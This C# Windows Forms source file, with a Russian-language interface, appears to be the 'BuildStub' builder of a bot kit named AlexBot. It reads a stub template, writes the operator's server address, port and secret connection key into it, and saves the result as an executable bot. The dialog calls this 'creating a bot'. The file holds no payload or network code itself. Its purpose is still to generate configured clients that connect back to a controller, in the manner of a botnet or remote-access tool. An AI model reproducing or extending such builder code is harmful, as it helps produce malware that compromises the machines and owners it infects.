using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Text;
using System.Windows.Forms;

namespace AlexBot
{
	public class BuildStub : Form
	{
		public const string BuildPath = "stub/build/stub.asm";

		private IContainer components = null;

		private TextBox textBox1;

		private Label label1;

		private TextBox textBox2;

		private Label label2;

		private Button button1;

		private SaveFileDialog saveFileDialog1;

		private TextBox textBox3;

		private Label label3;

		private Label label4;

		private ToolTip toolTip1;

		public BuildStub()
		{
			InitializeComponent();
		}

		private void BuildStubLoad(object sender, EventArgs e)
		{
		}

		private void Button1Click(object sender, EventArgs e)
		{
			if (File.Exists("stub/build/stub.asm"))
			{
				try
				{
					string text = File.ReadAllText("stub/build/stub.asm", Encoding.GetEncoding("Windows-1251"));
					string contents = text.Replace("<data>*</data>", "<data>" + textBox1.Text + ":" + textBox2.Text + ":" + textBox3.Text + "</data>");
					DialogResult dialogResult = saveFileDialog1.ShowDialog();
					if (dialogResult == DialogResult.OK)
					{
						string[] files = Directory.GetFiles(Path.GetDirectoryName("stub/build/stub.asm"));
						string directoryName = Path.GetDirectoryName(saveFileDialog1.FileName);
						string[] array = files;
						foreach (string text2 in array)
						{
							string fileName = Path.GetFileName(text2);
							if (fileName != Path.GetFileName("stub/build/stub.asm"))
							{
								File.Copy(text2, directoryName + "/" + fileName);
							}
						}
						File.WriteAllText(saveFileDialog1.FileName, contents, Encoding.GetEncoding("Windows-1251"));
						MessageBox.Show("Бот успешно создан!");
					}
				}
				catch (UnauthorizedAccessException)
				{
					MessageBox.Show("Не удаётся создать бота.");
				}
			}
		}

		protected override void Dispose(bool disposing)
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
			base.Dispose(disposing);
		}

		private void InitializeComponent()
		{
			components = new System.ComponentModel.Container();
			textBox1 = new System.Windows.Forms.TextBox();
			label1 = new System.Windows.Forms.Label();
			textBox2 = new System.Windows.Forms.TextBox();
			label2 = new System.Windows.Forms.Label();
			button1 = new System.Windows.Forms.Button();
			saveFileDialog1 = new System.Windows.Forms.SaveFileDialog();
			textBox3 = new System.Windows.Forms.TextBox();
			label3 = new System.Windows.Forms.Label();
			label4 = new System.Windows.Forms.Label();
			toolTip1 = new System.Windows.Forms.ToolTip(components);
			SuspendLayout();
			textBox1.Location = new System.Drawing.Point(12, 30);
			textBox1.Name = "textBox1";
			textBox1.Size = new System.Drawing.Size(160, 20);
			textBox1.TabIndex = 0;
			label1.Location = new System.Drawing.Point(12, 16);
			label1.Name = "label1";
			label1.Size = new System.Drawing.Size(100, 23);
			label1.TabIndex = 1;
			label1.Text = "Укажите сервер";
			textBox2.Location = new System.Drawing.Point(12, 78);
			textBox2.Name = "textBox2";
			textBox2.Size = new System.Drawing.Size(160, 20);
			textBox2.TabIndex = 2;
			label2.Location = new System.Drawing.Point(12, 64);
			label2.Name = "label2";
			label2.Size = new System.Drawing.Size(100, 23);
			label2.TabIndex = 3;
			label2.Text = "Укажите порт";
			button1.Location = new System.Drawing.Point(12, 153);
			button1.Name = "button1";
			button1.Size = new System.Drawing.Size(160, 31);
			button1.TabIndex = 4;
			button1.Text = "Сохранить";
			button1.UseVisualStyleBackColor = true;
			button1.Click += new System.EventHandler(Button1Click);
			saveFileDialog1.Filter = "EXE Files (*.exe)|*.exe";
			textBox3.Location = new System.Drawing.Point(13, 127);
			textBox3.Name = "textBox3";
			textBox3.Size = new System.Drawing.Size(160, 20);
			textBox3.TabIndex = 5;
			label3.Location = new System.Drawing.Point(12, 111);
			label3.Name = "label3";
			label3.Size = new System.Drawing.Size(138, 13);
			label3.TabIndex = 6;
			label3.Text = "Укажите секретный ключ подключения";
			label4.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 204);
			label4.Location = new System.Drawing.Point(156, 111);
			label4.Name = "label4";
			label4.Size = new System.Drawing.Size(17, 13);
			label4.TabIndex = 7;
			label4.Text = "?";
			toolTip1.SetToolTip(label4, "Секретный ключ указываете если в случае, вы имеете\r\nне свой IP адрес, для последующих подключений!");
			base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
			base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
			base.ClientSize = new System.Drawing.Size(185, 196);
			base.Controls.Add(label4);
			base.Controls.Add(textBox3);
			base.Controls.Add(label3);
			base.Controls.Add(button1);
			base.Controls.Add(textBox2);
			base.Controls.Add(label2);
			base.Controls.Add(textBox1);
			base.Controls.Add(label1);
			base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedToolWindow;
			base.Name = "BuildStub";
			base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
			Text = "Создать бота";
			base.Load += new System.EventHandler(BuildStubLoad);
			ResumeLayout(false);
			PerformLayout();
		}
	}
}
